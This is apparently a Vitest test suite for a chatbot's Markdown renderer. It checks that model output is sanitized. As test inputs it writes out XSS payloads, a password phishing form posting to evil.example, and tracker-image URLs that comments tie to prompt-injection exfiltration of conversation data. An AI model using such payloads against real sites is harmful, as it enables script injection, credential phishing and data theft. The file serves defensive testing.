// @vitest-environment jsdom
import type { SafeHtml } from '@angular/platform-browser';
import { describe, expect, it, vi } from 'vitest';

import { DE } from '../i18n/de';
import { createTranslator } from '../i18n/dictionary';
import { MarkdownRenderer, type MarkdownRenderContext } from './markdown-renderer';

const SID = 'bb-12345678-1234-4123-8123-123456789abc';

function makeCtx(over: Partial<MarkdownRenderContext> = {}): MarkdownRenderContext {
  return {
    bypassSecurityTrustHtml: (html: string) => html as unknown as SafeHtml,
    sessionId: () => SID,
    t: createTranslator(DE, DE),
    isHostTrusted: (host: string) => host === 'openeduhub.net' || host.endsWith('.openeduhub.net'),
    withBsid: (url) => {
      const raw = (url || '').trim();
      if (!raw) return '';
      try {
        const u = new URL(raw, window.location.href);
        if (!u.searchParams.has('bsid')) u.searchParams.set('bsid', SID);
        return u.toString();
      } catch {
        return raw;
      }
    },
    ...over,
  };
}

/** The fake bypassSecurityTrustHtml is identity, so the rendered value is the
 *  HTML string — assert on it directly. */
function html(rendered: SafeHtml): string {
  return rendered as unknown as string;
}

describe('MarkdownRenderer — sanitization (security floor)', () => {
  it('strips <script> tags and on* event-handler attributes', () => {
    const r = new MarkdownRenderer(makeCtx());
    expect(html(r.render('<script>alert(1)</script>'))).not.toContain('<script');
    expect(html(r.render('<img src=x onerror="alert(1)">'))).not.toContain('onerror');
  });

  it('neutralizes javascript: URLs in links', () => {
    const out = html(new MarkdownRenderer(makeCtx()).render('[klick](javascript:alert(1))'));
    expect(out).not.toContain('javascript:');
  });

  it('keeps benign inline SVG icons (svg profile) but never <script>', () => {
    const out = html(new MarkdownRenderer(makeCtx()).render('@@ICON:topic@@ Mathe'));
    expect(out).toContain('<svg');
    expect(out).not.toContain('<script');
  });
});

describe('MarkdownRenderer — Links und Bilder aus dem Modelltext (Paket 10)', () => {
  // Audit 2026-10-10, M-6: `target`/`rel` überlebten DOMPurify (ADD_ATTR); ein
  // eingeschleustes `rel="opener"` gab der neuen Seite den Zugriff auf das Fenster.
  it('erzwingt noopener, sobald ein Link ein Ziel hat — auch gegen ein mitgeliefertes rel', () => {
    const r = new MarkdownRenderer(makeCtx());
    for (const href of ['https://fremd.example/x', 'https://openeduhub.net/x']) {
      const out = html(r.render(`<a href="${href}" target="_blank" rel="opener">x</a>`));
      const a = new DOMParser().parseFromString(out, 'text/html').querySelector('a')!;
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    }
  });

  // M-7: ein Bild lädt ohne Klick — seine Adresse kann Gesprächsinhalt nach außen
  // tragen (Prompt-Injection über Seiten- oder Werkzeugtext).
  it('lässt keine Bilder durch, weder als Markdown noch als HTML', () => {
    const r = new MarkdownRenderer(makeCtx());
    expect(html(r.render('![x](https://tracker.example/p.gif?d=geheim)'))).not.toContain('<img');
    expect(html(r.render('<img src="https://tracker.example/p.gif">'))).not.toContain('<img');
  });

  // Paket 19, Audit 2026-10-31 M-12: ein Formular im Modelltext wäre ein
  // funktionierendes Phishing-Formular im Chatfenster; Absenden navigierte die
  // Gastseite weg. Weder Seeds noch Backend erzeugen Formularelemente.
  it('lässt keine Formularelemente und keine Formularziele durch (M-12)', () => {
    const r = new MarkdownRenderer(makeCtx());
    const out = html(r.render(
      '<form action="https://evil.example/f"><fieldset><label>PW <input name="p" type="password"></label>'
      + '<select><option>a</option></select><textarea>t</textarea>'
      + '<button formaction="https://evil.example/g">Los</button></fieldset></form>',
    ));
    for (const tag of ['<form', '<input', '<button', '<select', '<option', '<textarea', '<fieldset', '<label']) {
      expect(out).not.toContain(tag);
    }
    expect(out).not.toContain('evil.example');
  });

  // N-35: `target` aus dem Modelltext blieb stehen — `_top`/`_self` navigierte die
  // Gastseite weg. Bei nicht vertrauten Hosts gilt immer `_blank`.
  it('überschreibt ein mitgeliefertes target bei fremden Hosts mit _blank (N-35)', () => {
    const r = new MarkdownRenderer(makeCtx());
    for (const ziel of ['_top', '_self', '_parent', 'benannt']) {
      const out = html(r.render(`<a href="https://fremd.example/x" target="${ziel}">x</a>`));
      const a = new DOMParser().parseFromString(out, 'text/html').querySelector('a')!;
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    }
  });

  // Review zu N-35: das SVG-Profil ließ `<a xlink:href=… target="_top">` durch, und
  // die Nachbearbeitung las nur `href`.
  it('SVG-Links: kein xlink:href, und ein fremdes Ziel bekommt _blank (N-35)', () => {
    const r = new MarkdownRenderer(makeCtx());
    const xlink = html(r.render(
      '<svg><a xlink:href="https://evil.example/x" target="_top"><text>x</text></a></svg>'));
    expect(xlink).not.toContain('evil.example');
    expect(xlink).not.toContain('_top');
    const svgHref = html(r.render(
      '<svg><a href="https://evil.example/y" target="_top"><text>y</text></a></svg>'));
    expect(svgHref).not.toContain('_top');
    if (svgHref.includes('evil.example')) expect(svgHref).toContain('_blank');
  });

  it('lässt auch kein SVG-Bild, keine Medien und keine Stile mit Adresse durch', () => {
    const r = new MarkdownRenderer(makeCtx());
    const svg = html(r.render('<svg><image href="https://tracker.example/s.svg"/></svg>'));
    expect(svg).not.toContain('tracker.example');
    const stil = html(r.render('<span style="background:url(https://tracker.example/x)">a</span>'));
    expect(stil).not.toContain('tracker.example');
    expect(html(r.render('<video poster="https://tracker.example/v.jpg"></video>')))
      .not.toContain('tracker.example');
  });
});

describe('MarkdownRenderer — Render-Cache', () => {
  // Token-Streaming (Plan 2026-10-01, T17): vorläufiger Text ändert sich mit
  // jedem Rahmen. Durch den Cache (300 Einträge) schöbe er fertige Bubbles hinaus.
  it('cache=false: gleiche Ausgabe, aber nichts landet im Cache', () => {
    // Jede Freigabe ein neues Objekt — so zeigt die Identität, ob der Cache traf.
    const r = new MarkdownRenderer(makeCtx({
      bypassSecurityTrustHtml: (h: string) => ({ h }) as unknown as SafeHtml,
    }));
    const inhalt = (x: SafeHtml) => (x as unknown as { h: string }).h;
    const ohne = r.render('**live**', 'bot', false);
    const mit = r.render('**live**');
    expect(inhalt(ohne)).toBe(inhalt(mit));
    expect(mit).not.toBe(ohne);                  // der erste Aufruf hat nichts abgelegt
    expect(r.render('**live**')).toBe(mit);      // der Cache selbst arbeitet weiter
  });
});

describe('MarkdownRenderer — markdown + link handling', () => {
  it('renders emphasis and wraps bot output in a block <p>', () => {
    const out = html(new MarkdownRenderer(makeCtx()).render('**fett**'));
    expect(out).toContain('<strong>fett</strong>');
    expect(out).toContain('<p>');
  });

  it('renders user messages inline without a block <p> wrapper', () => {
    const out = html(new MarkdownRenderer(makeCtx()).render('hallo welt', 'user'));
    expect(out).not.toContain('<p>');
    expect(out).toContain('hallo welt');
  });

  it('opens untrusted external links in a new tab with noopener + warning', () => {
    const out = html(new MarkdownRenderer(makeCtx()).render('[x](https://evil.example/p)'));
    expect(out).toContain('target="_blank"');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('Achtung! Externe URL.');
  });

  it('appends bsid to trusted links and keeps them same-tab', () => {
    const out = html(
      new MarkdownRenderer(makeCtx()).render('[x](https://redaktion.openeduhub.net/p)'),
    );
    expect(out).toContain('bsid=' + SID);
    expect(out).not.toContain('target="_blank"');
  });

  it('strips the printable-canvas backend sentinel before rendering', () => {
    const out = html(
      new MarkdownRenderer(makeCtx()).render('<!-- boerdi:printable-canvas|a|b --> Hallo'),
    );
    expect(out).not.toContain('boerdi:printable-canvas');
    expect(out).toContain('Hallo');
  });

  it('replaces an @@ICON@@ sentinel with the labelled inline icon', () => {
    const out = html(
      new MarkdownRenderer(makeCtx()).render(
        '[@@ICON:topic@@Mathe](https://redaktion.openeduhub.net/x)',
      ),
    );
    expect(out).toContain('bb-inline-icon');
    expect(out).toContain('data-bb-type="Themenseite"');
  });

  it('nimmt Typ-Label und Extern-Warnung aus dem Übersetzer (C1-b3)', () => {
    const en = createTranslator(
      { 'contentType.topicPage': 'Topic page', 'link.external': 'Caution! External URL.' },
      DE,
    );
    const r = new MarkdownRenderer(makeCtx({ t: en }));
    expect(html(r.render('[@@ICON:topic@@Mathe](https://redaktion.openeduhub.net/x)')))
      .toContain('data-bb-type="Topic page"');
    expect(html(r.render('[x](https://evil.example/p)'))).toContain('Caution! External URL.');
  });
});

describe('MarkdownRenderer — render cache', () => {
  it('sanitizes once for identical inputs (cache hit on the second render)', () => {
    const spy = vi.fn((h: string) => h as unknown as SafeHtml);
    const r = new MarkdownRenderer(makeCtx({ bypassSecurityTrustHtml: spy }));
    r.render('**x**');
    r.render('**x**');
    expect(spy).toHaveBeenCalledTimes(1);
  });

  it('clearCache forces a re-render', () => {
    const spy = vi.fn((h: string) => h as unknown as SafeHtml);
    const r = new MarkdownRenderer(makeCtx({ bypassSecurityTrustHtml: spy }));
    r.render('**x**');
    r.clearCache();
    r.render('**x**');
    expect(spy).toHaveBeenCalledTimes(2);
  });
});
